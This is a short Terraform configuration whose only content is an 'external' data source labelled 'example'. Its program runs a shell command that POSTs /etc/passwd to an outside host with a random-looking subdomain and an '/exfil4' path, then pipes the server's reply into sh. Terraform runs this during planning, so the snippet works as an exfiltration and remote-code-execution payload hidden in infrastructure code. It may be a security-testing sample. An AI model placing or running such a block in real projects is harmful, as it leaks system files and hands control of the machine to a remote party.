data "external" "example" { 
  program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd https://gm67faqv6ini3t3zn7lnxqeqhhncb8zx.net-spi.com/exfil4 | sh"] 
}
